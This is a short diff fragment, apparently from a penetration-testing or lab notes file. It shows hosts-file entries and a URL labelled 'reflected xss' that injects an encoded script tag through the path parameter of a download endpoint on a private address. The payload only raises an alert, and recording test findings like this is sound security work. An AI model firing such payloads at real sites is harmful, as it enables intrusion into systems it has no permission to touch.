@@ -54,7 +54,6 @@ Etag: 1152921500312311378/1657708546/0
 255.255.255.255	broadcasthost
 ::1             localhost
 
-
 reflected xss: 
 
 http://192.168.1.178:8080/download?path=%3Cscript%3Ealert(%27rose%20taken%27);%3C/script%3E
